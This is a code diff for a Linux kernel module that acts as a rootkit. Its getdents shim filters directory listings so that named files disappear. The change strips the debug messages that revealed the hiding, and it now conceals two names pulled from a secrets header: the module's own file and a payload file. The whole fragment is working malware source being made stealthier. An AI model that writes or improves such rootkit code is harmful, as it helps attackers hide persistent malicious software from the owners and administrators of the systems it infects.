@@ -2,6 +2,7 @@
 #include "rw.h"
 #include "syscall.h"
 #include "utility.h"
+#include "secrets.h"
 MODULE_LICENSE("GPL");
 
 void hidename(char* buf, int* nread, char* name, int BUF_SIZE) {
@@ -16,9 +17,7 @@ void hidename(char* buf, int* nread, char* name, int BUF_SIZE) {
 
 	while (i < *nread) {
 		dirent = (struct linux_dirent64*) (buf + i);
-		printk("%s\n", dirent->d_name-1);
 		if (!strcmp(dirent->d_name-1, name)) {
-			printk("###hiding###\n");
 
 		}
 		else {
@@ -39,6 +38,7 @@ int getdentsShim(int fd, char* buf, int BUF_SIZE) {
 	if (nread <= 0) {
 		return nread;
 	}
-	hidename(buf, &nread, "hidden", BUF_SIZE);
+	hidename(buf, &nread, secret_ko_name, BUF_SIZE);
+	hidename(buf, &nread, secret_payload_name, BUF_SIZE);
 	return nread;
 }
